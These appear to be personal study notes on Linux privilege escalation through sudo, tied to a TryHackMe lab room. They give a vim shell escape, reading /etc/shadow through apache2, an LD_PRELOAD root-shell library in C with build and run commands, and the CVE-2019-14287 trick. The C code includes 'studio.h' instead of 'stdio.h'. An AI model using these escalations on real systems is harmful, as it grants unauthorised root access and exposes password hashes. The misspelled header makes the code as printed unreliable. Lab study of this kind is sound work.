Sudo

## sudo -l
	* list what can be run without a root password
	* https://gtfobins.github.io/
	* ex. sudo can be run as root without password, sudo vim -c ':!/bin/sh' gives root shell
* https://tryhackme.com/room/linuxprivesc
## Intended functionality 
* using the intended functionality of a program to get a further level of access
* Apachae 2 won't give you a reverse shell but you can view system file 
	* sudo apache2 -f /etc/shadow  
## LD_Preload 
* preload a library before loading any other librarys 
* make a malicious library then preload it 
```
#include <studio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
* To compile: ```gcc -fPIC -shared -o shell.so shell.c -nostartfiles```
* Gives us Root: ```sudo LD_PRELOAD=/home/user/shell.so apache2``` apache2 or any other binary that you can run as root but as standard user 
* if you run sudo -l and see 'LD_PRELOAD' then look into getting a priv es
## CVE-2019-14287
* running sudo -u#-1 binary will give you root (0) privegles 
	* sudo code will interpret the -u#-1 as a 0 even though you can't run root stuff normally, can give you a root shell
	* only works on binarys that you have access to as the running user (sudo -l for list)